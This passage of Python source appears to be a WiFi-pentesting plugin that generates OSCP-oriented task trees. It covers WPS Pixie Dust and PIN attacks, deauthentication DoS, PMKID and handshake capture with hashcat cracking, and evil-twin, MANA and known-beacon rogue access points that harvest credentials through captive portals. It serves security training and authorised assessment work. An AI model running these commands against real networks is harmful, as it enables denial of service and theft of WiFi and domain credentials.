"""
WiFi Pentesting service plugin

Generates tasks for WiFi security assessment including:
- Monitor mode setup and interface management
- WPS attacks (Pixie Dust, PIN brute-force, NULL PIN)
- WPA/WPA2-PSK attacks (PMKID capture, handshake capture & cracking)
- WPA-Enterprise attacks (EAP credential capture, evil twin)
- Deauthentication / DoS attacks
- Evil Twin attacks (Open, WPA-PSK, WPA-Enterprise)
- KARMA, MANA, Loud MANA, Known Beacon attacks
- Android NexMon monitor mode
- PCAP analysis & forensics (handshake extraction, credential harvesting, traffic decryption)

Extracted from HackTricks: pentesting-wifi/, basic-forensic-methodology/pcap-inspection/wifi-pcap-analysis.md
Generated by: CrackPot v1.0
Updated: 2025-10-07 with PCAP analysis phase
"""

from typing import Dict, Any, List
from .base import ServicePlugin
from .registry import ServiceRegistry


@ServiceRegistry.register
class WiFiAttackPlugin(ServicePlugin):
    """WiFi security assessment and attack plugin"""

    @property
    def name(self) -> str:
        return "wifi-attack"

    @property
    def default_ports(self) -> List[int]:
        return []  # Not port-specific, applies to wireless interfaces

    @property
    def service_names(self) -> List[str]:
        return ['wifi', 'wireless', '802.11', 'wlan']

    def detect(self, port_info: Dict[str, Any], profile: 'TargetProfile') -> bool:
        """Detect if WiFi attack tasks should be triggered - usually manually invoked"""
        # This plugin is manually triggered for wireless pentesting
        return False

    def get_task_tree(self, target: str, port: int, service_info: Dict[str, Any]) -> Dict[str, Any]:
        """
        Generate WiFi attack task tree

        Args:
            target: Target ESSID/BSSID (e.g., "TargetWiFi" or "00:11:22:33:44:55")
            port: WiFi channel (1-14 for 2.4GHz, 36+ for 5GHz)
            service_info: Optional metadata (security type: WPA2, WPS enabled, etc.)
        """
        essid = service_info.get('essid', target)
        bssid = service_info.get('bssid', '00:00:00:00:00:00')
        channel = service_info.get('channel', port or 6)
        security = service_info.get('security', 'WPA2')
        wps_enabled = service_info.get('wps', False)
        interface = service_info.get('interface', 'wlan0')

        tasks = {
            'id': f'wifi-attack-{essid.replace(" ", "-")}',
            'name': f'WiFi Pentesting: {essid}',
            'type': 'parent',
            'children': []
        }

        # ===== PHASE 0: SETUP & RECONNAISSANCE =====
        setup = {
            'id': f'wifi-setup-{essid.replace(" ", "-")}',
            'name': 'Setup & Interface Preparation',
            'type': 'parent',
            'children': []
        }

        # 0.1: Kill interfering processes
        setup['children'].append({
            'id': f'kill-processes-{interface}',
            'name': 'Kill Interfering Processes',
            'type': 'command',
            'metadata': {
                'command': 'airmon-ng check kill',
                'description': 'Kill NetworkManager and other processes that interfere with monitor mode',
                'tags': ['OSCP:HIGH', 'QUICK_WIN', 'MANUAL'],
                'flag_explanations': {
                    'check': 'Check for interfering processes',
                    'kill': 'Terminate processes that prevent monitor mode'
                },
                'success_indicators': [
                    'NetworkManager stopped',
                    'wpa_supplicant killed',
                    'dhclient terminated'
                ],
                'failure_indicators': [
                    'Processes respawn (systemd auto-restart)',
                    'Permission denied (run as root)'
                ],
                'alternatives': [
                    'systemctl stop NetworkManager',
                    'systemctl stop wpa_supplicant',
                    'killall wpa_supplicant NetworkManager dhclient'
                ],
                'next_steps': [
                    'Enable monitor mode on wireless interface',
                    'Verify monitor mode: iwconfig'
                ],
                'notes': 'Must run as root. Services will restart on reboot.'
            }
        })

        # 0.2: Enable monitor mode
        setup['children'].append({
            'id': f'monitor-mode-{interface}',
            'name': 'Enable Monitor Mode',
            'type': 'command',
            'metadata': {
                'command': f'airmon-ng start {interface}',
                'description': 'Put wireless interface into monitor mode for packet capture and injection',
                'tags': ['OSCP:HIGH', 'QUICK_WIN', 'MANUAL'],
                'flag_explanations': {
                    'start': 'Start monitor mode on interface',
                    f'{interface}': 'Wireless interface name'
                },
                'estimated_time': '< 30 seconds',
                'success_indicators': [
                    f'Monitor mode enabled on {interface}mon',
                    'Interface in mode: Monitor (check with iwconfig)',
                    'Can see beacon frames with airodump-ng'
                ],
                'failure_indicators': [
                    'No wireless extensions',
                    'Driver does not support monitor mode',
                    'Interface busy (kill processes first)'
                ],
                'alternatives': [
                    f'iwconfig {interface} mode monitor',
                    f'ifconfig {interface} down && iwconfig {interface} mode monitor && ifconfig {interface} up',
                    'ip link set {interface} down && iw {interface} set monitor control && ip link set {interface} up'
                ],
                'next_steps': [
                    f'Scan for networks: airodump-ng {interface}mon',
                    'Identify target ESSID, BSSID, channel',
                    'Note connected clients (stations)'
                ],
                'notes': 'Monitor mode interface typically named wlan0mon, wlan1mon, etc.'
            }
        })

        # 0.3: Network reconnaissance
        setup['children'].append({
            'id': f'airodump-scan-{interface}',
            'name': 'Scan WiFi Networks',
            'type': 'command',
            'metadata': {
                'command': f'airodump-ng {interface}mon --band abg --wps',
                'description': 'Scan for all WiFi networks on 2.4GHz and 5GHz bands, show WPS status',
                'tags': ['OSCP:HIGH', 'RECON', 'QUICK_WIN'],
                'flag_explanations': {
                    f'{interface}mon': 'Monitor mode interface',
                    '--band abg': 'Scan 802.11a (5GHz), b (2.4GHz), g (2.4GHz)',
                    '--wps': 'Show WPS information (locked/unlocked)'
                },
                'estimated_time': 'Continuous (press Ctrl+C after 1-2 minutes)',
                'success_indicators': [
                    'Networks detected with ESSID, BSSID, channel',
                    'WPS status shown (useful for WPS attacks)',
                    'Client stations identified (MAC addresses)'
                ],
                'alternatives': [
                    f'airodump-ng {interface}mon (2.4GHz only)',
                    f'airodump-ng {interface}mon --band a (5GHz only)',
                    f'iwlist {interface} scan | grep "ESSID\\|Channel\\|Quality"'
                ],
                'next_steps': [
                    'Note target ESSID, BSSID, channel, encryption',
                    'Identify attack surface: WPS enabled? Clients connected?',
                    'Choose attack: WPS -> WPA-PMKID -> WPA-Handshake'
                ],
                'notes': 'Record: ESSID, BSSID, channel, encryption (WPA/WPA2/WPA3), # of clients, WPS status'
            }
        })

        tasks['children'].append(setup)

        # ===== PHASE 1: WPS ATTACKS (if WPS enabled) =====
        if wps_enabled or 'wps' in service_info:
            wps_attacks = {
                'id': f'wps-attacks-{essid.replace(" ", "-")}',
                'name': 'WPS Attacks',
                'type': 'parent',
                'children': []
            }

            # 1.1: WPS Pixie Dust Attack
            wps_attacks['children'].append({
                'id': f'wps-pixie-dust-{essid.replace(" ", "-")}',
                'name': 'WPS Pixie Dust Attack',
                'type': 'command',
                'metadata': {
                    'command': f'reaver -i {interface}mon -b {bssid} -c {channel} -K 1 -N -vv',
                    'description': 'Offline WPS attack exploiting weak random number generation (fast, 5-30 seconds)',
                    'tags': ['OSCP:HIGH', 'QUICK_WIN', 'EXPLOIT'],
                    'flag_explanations': {
                        '-i': 'Monitor mode interface',
                        '-b': 'Target BSSID (MAC address of AP)',
                        '-c': 'Target channel',
                        '-K': 'Pixie Dust attack mode (1 = enabled)',
                        '-N': 'Do not send NACK packets (more stable)',
                        '-vv': 'Very verbose output'
                    },
                    'estimated_time': '5-30 seconds if vulnerable, 2-5 minutes if not',
                    'success_indicators': [
                        'WPS PIN recovered',
                        'PSK (WPA password) revealed',
                        '[+] PIN: 12345670'
                    ],
                    'failure_indicators': [
                        'Not vulnerable to Pixie Dust',
                        'WPS locked after failed attempts',
                        'AP not responding to WPS requests'
                    ],
                    'alternatives': [
                        f'bully {interface}mon -b {bssid} -d -v 3 (alternative Pixie Dust tool)',
                        f'OneShot-C -i {interface} -K -b {bssid} (no monitor mode needed)',
                        'wifite -i {interface}mon --wps-only --pixie (automated)'
                    ],
                    'next_steps': [
                        'If successful: Connect with discovered PSK',
                        'If failed: Try NULL PIN attack',
                        'If failed: Try WPS PIN brute-force (long)',
                        'If WPS locked: Switch to WPA-PMKID or handshake attack'
                    ],
                    'notes': 'Pixie Dust exploits weak PRNG in some routers (Broadcom, Ralink). Fast win if vulnerable!'
                }
            })

            # 1.2: NULL PIN Attack
            wps_attacks['children'].append({
                'id': f'wps-null-pin-{essid.replace(" ", "-")}',
                'name': 'WPS NULL PIN Attack',
                'type': 'command',
                'metadata': {
                    'command': f'reaver -i {interface}mon -b {bssid} -c {channel} -f -N -g 1 -vv -p ""',
                    'description': 'Test if AP accepts empty/null WPS PIN (rare but instant win)',
                    'tags': ['OSCP:MEDIUM', 'QUICK_WIN', 'EXPLOIT'],
                    'flag_explanations': {
                        '-f': 'Fixed channel (do not hop)',
                        '-g': 'Max DH prime attempts',
                        '-p ""': 'Empty PIN (NULL PIN)'
                    },
                    'estimated_time': '< 1 minute',
                    'success_indicators': [
                        'PIN accepted (VERY rare)',
                        'PSK revealed'
                    ],
                    'failure_indicators': [
                        'PIN rejected (expected)',
                        'WPS locked'
                    ],
                    'notes': 'Rarely works but worth trying - takes < 1 minute'
                }
            })

            # 1.3: WPS PIN Brute-force
            wps_attacks['children'].append({
                'id': f'wps-bruteforce-{essid.replace(" ", "-")}',
                'name': 'WPS PIN Brute-force',
                'type': 'command',
                'metadata': {
                    'command': f'reaver -i {interface}mon -b {bssid} -c {channel} -vv -L -N',
                    'description': 'Brute-force all 11,000 possible WPS PINs (SLOW: 4-10 hours, often fails due to AP lockout)',
                    'tags': ['OSCP:LOW', 'BRUTE_FORCE', 'NOISY'],
                    'flag_explanations': {
                        '-L': 'Ignore WPS locks (keep trying)',
                        '-N': 'Do not send NACK packets'
                    },
                    'estimated_time': '4-10 hours (if no rate limiting)',
                    'success_indicators': [
                        'PIN discovered after many attempts',
                        'PSK revealed'
                    ],
                    'failure_indicators': [
                        'WPS locked (AP blocks after X failed attempts)',
                        'Rate limiting (AP slows down responses)',
                        'AP reboots or WPS disabled remotely'
                    ],
                    'alternatives': [
                        f'bully {interface}mon -b {bssid} -c {channel} -S -F -B -v 3',
                        'wifite -i {interface}mon --wps-only (automated with timeout)',
                        'airgeddon: WPS All-in-One attack'
                    ],
                    'notes': 'Modern APs lock WPS after 3-5 failed PINs. Not OSCP-relevant due to time.'
                }
            })

            tasks['children'].append(wps_attacks)

        # ===== PHASE 2: WPA/WPA2-PSK ATTACKS =====
        wpa_attacks = {
            'id': f'wpa-attacks-{essid.replace(" ", "-")}',
            'name': 'WPA/WPA2-PSK Attacks',
            'type': 'parent',
            'children': []
        }

        # 2.1: PMKID Capture (clientless)
        wpa_attacks['children'].append({
            'id': f'pmkid-capture-{essid.replace(" ", "-")}',
            'name': 'PMKID Capture (Clientless)',
            'type': 'command',
            'metadata': {
                'command': f'hcxdumptool -i {interface}mon -o pmkid_{essid.replace(" ", "_")}.pcap --enable_status=1',
                'description': 'Capture PMKID from AP (clientless attack - no clients needed!) for offline cracking',
                'tags': ['OSCP:HIGH', 'QUICK_WIN', 'AUTOMATED'],
                'flag_explanations': {
                    '-i': 'Monitor mode interface',
                    '-o': 'Output pcap file',
                    '--enable_status=1': 'Show real-time status of captured PMKIDs'
                },
                'estimated_time': '1-5 minutes to capture',
                'success_indicators': [
                    'PMKID captured (shown in console)',
                    'Output: MP:M1M2 PMKID captured',
                    'Valid hash extracted with hcxpcaptool'
                ],
                'failure_indicators': [
                    'No PMKID (AP does not support RSN IE)',
                    'Old/patched routers (PMKID attack fixed after 2018)'
                ],
                'alternatives': [
                    f'eaphammer --pmkid --interface {interface} --channel {channel} --bssid {bssid}',
                    'bettercap with wpa.pmkid module',
                    'Manual: airodump-ng capture + analyze with wireshark for PMKID in EAPOL frame 1'
                ],
                'next_steps': [
                    'Convert to hashcat format: hcxpcaptool -z pmkid.hc22000 pmkid.pcap',
                    'Crack with hashcat: hashcat -m 22000 pmkid.hc22000 rockyou.txt',
                    'If PMKID not available: Capture handshake with deauth attack'
                ],
                'notes': 'PMKID attack (2018) is HUGE - no clients needed, just AP interaction! Check for 4-part hash.'
            }
        })

        # 2.2: Handshake Capture (requires clients)
        wpa_attacks['children'].append({
            'id': f'handshake-capture-{essid.replace(" ", "-")}',
            'name': 'WPA Handshake Capture',
            'type': 'parent',
            'children': [
                {
                    'id': f'airodump-capture-{essid.replace(" ", "-")}',
                    'name': 'Start airodump Capture',
                    'type': 'command',
                    'metadata': {
                        'command': f'airodump-ng {interface}mon -c {channel} --bssid {bssid} -w handshake_{essid.replace(" ", "_")} --output-format pcap',
                        'description': 'Monitor target AP and capture 4-way handshake when client connects/reconnects',
                        'tags': ['OSCP:HIGH', 'MANUAL'],
                        'flag_explanations': {
                            '-c': 'Lock to specific channel (prevent hopping)',
                            '--bssid': 'Filter to target AP only',
                            '-w': 'Output file prefix',
                            '--output-format pcap': 'Pcap format for hashcat/aircrack'
                        },
                        'success_indicators': [
                            'Handshake captured (shown in top-right: WPA handshake: XX:XX:XX)',
                            'Client (STA) visible in station list'
                        ],
                        'notes': 'Leave running while performing deauth attack in separate terminal'
                    }
                },
                {
                    'id': f'deauth-attack-{essid.replace(" ", "-")}',
                    'name': 'Deauthenticate Clients',
                    'type': 'command',
                    'metadata': {
                        'command': f'aireplay-ng -0 0 -a {bssid} {interface}mon',
                        'description': 'Send deauth packets to disconnect clients and force reconnection (captures handshake)',
                        'tags': ['OSCP:HIGH', 'NOISY', 'DOS'],
                        'flag_explanations': {
                            '-0': 'Deauthentication attack mode',
                            '0': 'Continuous deauth (use 5-10 for limited bursts)',
                            '-a': 'Target AP BSSID',
                            '-c <client_mac>': 'Optional: Target specific client (more effective)'
                        },
                        'estimated_time': '10-60 seconds until handshake captured',
                        'success_indicators': [
                            'Client disconnects and reconnects',
                            'airodump shows "WPA handshake" in top-right corner'
                        ],
                        'failure_indicators': [
                            'Clients not reconnecting (user intervention)',
                            'Deauth frames not working (AP has protection)',
                            'No clients connected (wait or switch to PMKID)'
                        ],
                        'alternatives': [
                            f'aireplay-ng -0 10 -a {bssid} -c <client_mac> {interface}mon (targeted)',
                            f'mdk4 {interface}mon d -c {channel} -b {bssid} (disassociation)',
                            'wifite -i {interface}mon --kill (automated handshake capture)'
                        ],
                        'notes': 'Stop after handshake captured (Ctrl+C). Deauth is noisy and illegal without authorization!'
                    }
                },
                {
                    'id': f'verify-handshake-{essid.replace(" ", "-")}',
                    'name': 'Verify Handshake Capture',
                    'type': 'command',
                    'metadata': {
                        'command': f'aircrack-ng handshake_{essid.replace(" ", "_")}*.cap',
                        'description': 'Verify captured handshake is complete and valid before cracking',
                        'tags': ['QUICK_WIN', 'MANUAL'],
                        'flag_explanations': {
                            'aircrack-ng': 'WPA/WPA2 cracking tool (also verifies handshakes)',
                            '*.cap': 'Wildcard to check all capture files'
                        },
                        'success_indicators': [
                            '1 handshake or X handshakes shown',
                            'Target network listed with handshake count'
                        ],
                        'alternatives': [
                            f'tshark -r handshake.cap -Y eapol (should see 4 EAPOL frames)',
                            f'pyrit -r handshake.cap analyze',
                            f'cowpatty -r handshake.cap -s "{essid}" -f -'
                        ],
                        'notes': 'Need all 4 EAPOL messages (or at least msg 1 & 2). Incomplete handshake cannot be cracked.'
                    }
                }
            ]
        })

        # 2.3: Offline Cracking
        wpa_attacks['children'].append({
            'id': f'crack-handshake-{essid.replace(" ", "-")}',
            'name': 'Crack WPA Handshake/PMKID',
            'type': 'parent',
            'children': [
                {
                    'id': f'hashcat-crack-{essid.replace(" ", "-")}',
                    'name': 'Crack with Hashcat (GPU)',
                    'type': 'command',
                    'metadata': {
                        'command': f'hashcat -m 22000 handshake.hc22000 /usr/share/wordlists/rockyou.txt --force',
                        'description': 'GPU-accelerated WPA/WPA2 cracking (fast on dedicated hardware)',
                        'tags': ['OSCP:HIGH', 'BRUTE_FORCE'],
                        'flag_explanations': {
                            '-m 22000': 'WPA-PBKDF2-PMKID+EAPOL hash mode (newer format)',
                            '--force': 'Run even without ideal GPU drivers',
                            'rockyou.txt': 'Common password wordlist (14M passwords)'
                        },
                        'estimated_time': '5 minutes - hours (depends on GPU, wordlist size)',
                        'success_indicators': [
                            'Password recovered: STATUS.......: Cracked',
                            'Output shows plaintext password'
                        ],
                        'alternatives': [
                            'aircrack-ng handshake.cap -w rockyou.txt (CPU-only, slower)',
                            'john handshake.hccapx --wordlist=rockyou.txt',
                            'cowpatty -r handshake.cap -f rockyou.txt -s "ESSID"',
                            'Cloud cracking: hashcat on AWS GPU instances'
                        ],
                        'notes': 'Convert .cap to .hc22000: hcxpcaptool -o handshake.hc22000 handshake.cap'
                    }
                },
                {
                    'id': f'aircrack-crack-{essid.replace(" ", "-")}',
                    'name': 'Crack with Aircrack-ng (CPU)',
                    'type': 'command',
                    'metadata': {
                        'command': f'aircrack-ng handshake*.cap -w /usr/share/wordlists/rockyou.txt -b {bssid}',
                        'description': 'CPU-based WPA cracking (slower but no GPU required)',
                        'tags': ['OSCP:MEDIUM', 'BRUTE_FORCE'],
                        'flag_explanations': {
                            '-w': 'Wordlist path',
                            '-b': 'Target BSSID (if multiple networks in capture)'
                        },
                        'estimated_time': 'Hours to days (depends on CPU, wordlist)',
                        'success_indicators': [
                            'KEY FOUND! [ password123 ]'
                        ],
                        'notes': 'Use hashcat with GPU for 10-100x speed improvement'
                    }
                }
            ]
        })

        tasks['children'].append(wpa_attacks)

        # ===== PHASE 3: EVIL TWIN ATTACKS =====
        evil_twin = {
            'id': f'evil-twin-{essid.replace(" ", "-")}',
            'name': 'Evil Twin & Rogue AP Attacks',
            'type': 'parent',
            'children': []
        }

        # 3.1: Open Evil Twin (Captive Portal)
        evil_twin['children'].append({
            'id': f'evil-twin-open-{essid.replace(" ", "-")}',
            'name': 'Open Evil Twin + Captive Portal',
            'type': 'command',
            'metadata': {
                'command': f'eaphammer -i {interface} --essid "{essid}" --captive-portal',
                'description': 'Create fake open WiFi with same ESSID, capture credentials via captive portal',
                'tags': ['OSCP:MEDIUM', 'EXPLOIT', 'PHISHING'],
                'flag_explanations': {
                    '-i': 'Wireless interface (NOT in monitor mode for eaphammer)',
                    '--essid': 'Target network name (clone existing)',
                    '--captive-portal': 'Serve fake login page to capture credentials'
                },
                'estimated_time': 'Setup: 2-3 minutes, Attack: continuous',
                'success_indicators': [
                    'Fake AP running',
                    'Clients connect to evil twin',
                    'Credentials submitted on captive portal'
                ],
                'failure_indicators': [
                    'Clients prefer encrypted network (saved as WPA in PNL)',
                    'No clients connecting (signal strength too weak)',
                    'OS/AV warns users about open network'
                ],
                'alternatives': [
                    'airgeddon: Evil Twin Attack menu (options 5-9)',
                    'wifiphisher: Automated evil twin with multiple portal templates',
                    f'airbase-ng -a {bssid} --essid "{essid}" -c {channel} {interface}mon (manual, no captive portal)',
                    'hostapd + dnsmasq + captive portal (manual full setup)'
                ],
                'next_steps': [
                    'Optional: DoS real AP to force clients to fake one',
                    'Customize captive portal to match legitimate login page',
                    'Capture credentials in real-time',
                    'Perform LAN attacks once clients connect'
                ],
                'notes': 'Clients saved network as WPA will NOT auto-connect to open twin. Combine with deauth of real AP.'
            }
        })

        # 3.2: WPA Evil Twin (Handshake Capture)
        evil_twin['children'].append({
            'id': f'evil-twin-wpa-{essid.replace(" ", "-")}',
            'name': 'WPA Evil Twin (Handshake Farming)',
            'type': 'command',
            'metadata': {
                'command': f'eaphammer -i {interface} -e "{essid}" -c {channel} --creds --auth wpa-psk --wpa-passphrase "FakePassword123"',
                'description': 'Fake WPA AP to capture handshakes from clients attempting connection',
                'tags': ['OSCP:HIGH', 'EXPLOIT'],
                'flag_explanations': {
                    '-e': 'ESSID to clone',
                    '-c': 'Channel (match real AP or use different)',
                    '--creds': 'Capture credentials/handshakes',
                    '--auth wpa-psk': 'WPA-PSK authentication',
                    '--wpa-passphrase': 'Fake password (clients will fail auth, but handshake captured)'
                },
                'success_indicators': [
                    'Clients attempt to connect',
                    'Handshakes captured even if auth fails',
                    'Can crack captured handshakes offline'
                ],
                'notes': 'Does not require knowing real password. Handshakes captured for offline cracking!'
            }
        })

        # 3.3: WPA-Enterprise Evil Twin
        evil_twin['children'].append({
            'id': f'evil-twin-enterprise-{essid.replace(" ", "-")}',
            'name': 'WPA-Enterprise Evil Twin (Credential Harvest)',
            'type': 'command',
            'metadata': {
                'command': f'eaphammer -i {interface} --channel {channel} --auth wpa-eap --essid "{essid}" --creds',
                'description': 'Fake enterprise WiFi to capture domain credentials (EAP downgrade to GTC/MD5)',
                'tags': ['OSCP:HIGH', 'EXPLOIT', 'PRIVESC'],
                'flag_explanations': {
                    '--auth wpa-eap': 'WPA-Enterprise mode (EAP authentication)',
                    '--creds': 'Capture credentials',
                    'Default': 'EAPHammer downgrades to GTC for plaintext passwords'
                },
                'estimated_time': 'Setup: 5 minutes, Attack: continuous',
                'success_indicators': [
                    'Clients connect and send credentials',
                    'Domain usernames captured',
                    'Password hashes (MSCHAPv2) or plaintext (GTC) captured'
                ],
                'alternatives': [
                    'hostapd-wpe: Enterprise AP with credential logging',
                    'airgeddon: WPA-Enterprise Evil Twin (downgrades to EAP-MD5)',
                    'Manual: hostapd-wpe with custom config'
                ],
                'next_steps': [
                    'Crack captured MSCHAPv2 hashes with hashcat -m 5500',
                    'Use captured domain creds for lateral movement',
                    'Test credentials against VPN, email, file shares'
                ],
                'notes': 'Enterprise WiFi users often auto-connect without certificate validation - high success rate!'
            }
        })

        # 3.4: DoS Real AP
        evil_twin['children'].append({
            'id': f'dos-real-ap-{essid.replace(" ", "-")}',
            'name': 'DoS Real AP (Force Clients to Evil Twin)',
            'type': 'command',
            'metadata': {
                'command': f'mdk4 {interface}mon d -c {channel} -b {bssid}',
                'description': 'Continuous deauth/disassociation to prevent clients connecting to real AP',
                'tags': ['OSCP:MEDIUM', 'DOS', 'NOISY'],
                'flag_explanations': {
                    'd': 'Deauthentication / disassociation mode',
                    '-c': 'Target channel',
                    '-b': 'Target BSSID'
                },
                'alternatives': [
                    f'aireplay-ng -0 0 -a {bssid} {interface}mon',
                    'airgeddon: DoS options (deauth, disassoc, TKIP/EAPOL attacks)',
                    'wifiphisher: Automatic deauth during evil twin'
                ],
                'notes': 'Run in separate terminal while evil twin is active. VERY noisy!'
            }
        })

        tasks['children'].append(evil_twin)

        # ===== PHASE 4: KARMA/MANA ATTACKS =====
        karma_mana = {
            'id': f'karma-mana-{essid.replace(" ", "-")}',
            'name': 'KARMA / MANA / Known Beacon Attacks',
            'type': 'parent',
            'children': []
        }

        # 4.1: MANA Attack
        karma_mana['children'].append({
            'id': f'mana-attack-{interface}',
            'name': 'MANA Attack',
            'type': 'command',
            'metadata': {
                'command': f'eaphammer -i {interface} --cloaking full --mana --captive-portal',
                'description': 'Respond to directed probe requests with cached SSIDs, trick devices into connecting',
                'tags': ['OSCP:MEDIUM', 'EXPLOIT', 'AUTOMATED'],
                'flag_explanations': {
                    '--cloaking full': 'Respond only to probes (do not broadcast beacons)',
                    '--mana': 'Enable MANA attack (respond to probe requests with known SSIDs)',
                    '--captive-portal': 'Serve captive portal on connection'
                },
                'success_indicators': [
                    'Devices connect looking for known networks',
                    'PNL (Preferred Network List) entries captured',
                    'Credentials harvested via captive portal'
                ],
                'alternatives': [
                    'hostapd-mana: Original MANA implementation',
                    'wifiphisher: Automated MANA + evil twin'
                ],
                'notes': 'MANA captures device probe requests and responds with matching SSIDs'
            }
        })

        # 4.2: Loud MANA
        karma_mana['children'].append({
            'id': f'loud-mana-{interface}',
            'name': 'Loud MANA Attack',
            'type': 'command',
            'metadata': {
                'command': f'eaphammer -i {interface} --cloaking full --mana --loud --captive-portal',
                'description': 'Broadcast ALL SSIDs from captured probe requests (cast wide net)',
                'tags': ['OSCP:MEDIUM', 'EXPLOIT', 'NOISY'],
                'flag_explanations': {
                    '--loud': 'Broadcast all captured SSIDs to all devices (not just requester)'
                },
                'notes': 'More aggressive than MANA - broadcasts all SSIDs to maximize connections'
            }
        })

        # 4.3: Known Beacon Attack
        karma_mana['children'].append({
            'id': f'known-beacons-{interface}',
            'name': 'Known Beacon Attack',
            'type': 'command',
            'metadata': {
                'command': f'eaphammer -i {interface} --mana --known-beacons --known-ssids-file /usr/share/wordlists/common_ssids.txt --captive-portal',
                'description': 'Broadcast common SSIDs from wordlist (linksys, netgear, starbucks, etc.)',
                'tags': ['OSCP:LOW', 'BRUTE_FORCE', 'NOISY'],
                'flag_explanations': {
                    '--known-beacons': 'Brute-force SSIDs from wordlist',
                    '--known-ssids-file': 'Wordlist of common network names'
                },
                'alternatives': [
                    'forge-beacons: Rapid beacon burst attack',
                    'mdk4 beacon flooding (mode b)'
                ],
                'notes': 'Works against devices with common networks in PNL (Starbucks, Airport WiFi, etc.)'
            }
        })

        tasks['children'].append(karma_mana)

        # ===== PHASE 5: ADVANCED TECHNIQUES =====
        advanced = {
            'id': f'advanced-wifi-{essid.replace(" ", "-")}',
            'name': 'Advanced WiFi Techniques',
            'type': 'parent',
            'children': []
        }

        # 5.1: Android NexMon Monitor Mode
        advanced['children'].append({
            'id': f'nexmon-android-{interface}',
            'name': 'Android NexMon Monitor Mode',
            'type': 'manual',
            'metadata': {
                'description': 'Enable monitor mode and packet injection on Android with Broadcom WiFi chipsets',
                'tags': ['OSCP:LOW', 'MANUAL', 'ADVANCED'],
                'alternatives': [
                    'Hijacker app: Automated NexMon + airodump/wifite on Android',
                    'Manual: svc wifi disable && ifconfig wlan0 up && nexutil -s0x613 -i -v2',
                    'NetHunter chroot: Run aircrack-ng suite on Android',
                    'Supported devices: Galaxy S7/S8/S10, Pixel 1, Nexus 6P'
                ],
                'success_indicators': [
                    'wlan0 in monitor mode',
                    'Can capture raw 802.11 frames',
                    'Packet injection working'
                ],
                'next_steps': [
                    'Run airodump-ng --band abg wlan0',
                    'Capture handshakes with wifite -i wlan0',
                    'Inject deauth frames with aireplay-ng'
                ],
                'notes': 'Requires: Root, Magisk, NexMon module for specific device/firmware. See HackTricks guide.'
            }
        })

        # 5.2: WPA3 Attacks (Dragonblood)
        advanced['children'].append({
            'id': f'wpa3-dragonblood-{essid.replace(" ", "-")}',
            'name': 'WPA3 Dragonblood Attack',
            'type': 'manual',
            'metadata': {
                'description': 'Downgrade WPA3 to WPA2, exploit SAE (Simultaneous Authentication of Equals)',
                'tags': ['OSCP:LOW', 'ADVANCED', 'RESEARCH'],
                'alternatives': [
                    'Dragonslayer tool: https://github.com/vanhoefm/dragonslayer',
                    'Check for downgrade: hostapd with WPA2 only, see if WPA3 client connects',
                    'Side-channel attacks on SAE handshake'
                ],
                'notes': 'WPA3 still vulnerable to downgrade attacks. Many devices fallback to WPA2.'
            }
        })

        tasks['children'].append(advanced)

        # ===== PHASE 6: PCAP ANALYSIS & FORENSICS =====
        pcap_analysis = {
            'id': f'pcap-analysis-{essid.replace(" ", "-")}',
            'name': 'PCAP Analysis & Credential Extraction',
            'type': 'parent',
            'children': []
        }

        # 6.1: Wireshark WLAN Traffic Analysis
        pcap_analysis['children'].append({
            'id': f'wireshark-wlan-{essid.replace(" ", "-")}',
            'name': 'Wireshark WLAN Traffic Analysis',
            'type': 'manual',
            'metadata': {
                'description': 'Analyze WiFi capture for BSSIDs, authentication attempts, and credential opportunities',
                'tags': ['OSCP:MEDIUM', 'FORENSICS', 'MANUAL'],
                'notes': [
                    'Wireshark: Wireless --> WLAN Traffic for SSID overview',
                    'View all BSSIDs (MAC addresses of APs)',
                    'Check "Auth" column for authentication attempts',
                    'If authentication found: Extract for offline cracking'
                ],
                'next_steps': [
                    'Identify BSSIDs with authentication attempts',
                    'Extract handshakes with aircrack-ng or tshark',
                    'Crack extracted handshakes with hashcat/aircrack-ng',
                    'Check for data exfiltration in beacon frames'
                ],
                'alternatives': [
                    'GUI: Open pcap in Wireshark, Statistics --> WLAN Traffic',
                    'CLI: tshark -r capture.pcap -Y "wlan.fc.type_subtype == 0x0000" (management frames)',
                    'CLI: tshark -r capture.pcap -Y "eapol" (authentication)'
                ],
                'success_indicators': [
                    'Multiple BSSIDs identified',
                    'Authentication handshakes visible',
                    'Client STAs (stations) detected'
                ],
                'failure_indicators': [
                    'No authentication in capture (only beacon frames)',
                    'Capture too short (missing handshake)',
                    'Encrypted data frames only'
                ]
            }
        })

        # 6.2: Extract WPA Handshake from PCAP
        pcap_analysis['children'].append({
            'id': f'extract-handshake-{essid.replace(" ", "-")}',
            'name': 'Extract & Crack WPA Handshake from PCAP',
            'type': 'command',
            'metadata': {
                'command': f'aircrack-ng -w /usr/share/wordlists/rockyou.txt -b {bssid} capture.pcap',
                'description': 'Extract WPA/WPA2 handshake from existing PCAP and crack offline',
                'tags': ['OSCP:MEDIUM', 'FORENSICS', 'BRUTE_FORCE'],
                'flag_explanations': {
                    'aircrack-ng': 'WPA/WPA2 PSK cracking tool',
                    '-w': 'Wordlist for password cracking',
                    '-b': 'Target BSSID (filter if multiple networks in pcap)',
                    'capture.pcap': 'PCAP file containing 4-way handshake'
                },
                'estimated_time': 'Minutes to hours depending on wordlist size',
                'success_indicators': [
                    '1 handshake found in capture',
                    'KEY FOUND! [ password123 ]',
                    'WPA passphrase recovered'
                ],
                'failure_indicators': [
                    'No handshake found (incomplete capture)',
                    'Handshake corrupt or missing EAPOL frames',
                    'Password not in wordlist'
                ],
                'next_steps': [
                    'If no handshake: Check with tshark -r capture.pcap -Y eapol',
                    'If handshake incomplete: Need all 4 EAPOL frames',
                    'Convert to hashcat: hcxpcaptool -o hash.hc22000 capture.pcap',
                    'GPU cracking: hashcat -m 22000 hash.hc22000 rockyou.txt'
                ],
                'alternatives': [
                    'Verify handshake first: aircrack-ng capture.pcap (shows count)',
                    'tshark filter: tshark -r capture.pcap -Y "eapol" -T fields -e frame.number',
                    'Hashcat conversion: hcxpcaptool -z hash.hc22000 capture.pcap',
                    'Online tools: wpa-sec.stanev.org (upload cap/pcap for cloud cracking)'
                ],
                'notes': 'OSCP: You may receive PCAP files as evidence or from network taps. Extract credentials for lateral movement.'
            }
        })

        # 6.3: Beacon Frame Data Exfiltration Detection
        pcap_analysis['children'].append({
            'id': f'beacon-exfil-detect-{essid.replace(" ", "-")}',
            'name': 'Detect Data Exfiltration in Beacon Frames',
            'type': 'command',
            'metadata': {
                'command': f'tshark -r capture.pcap -Y "wlan contains {essid}" -V | grep -i "ssid\\|data"',
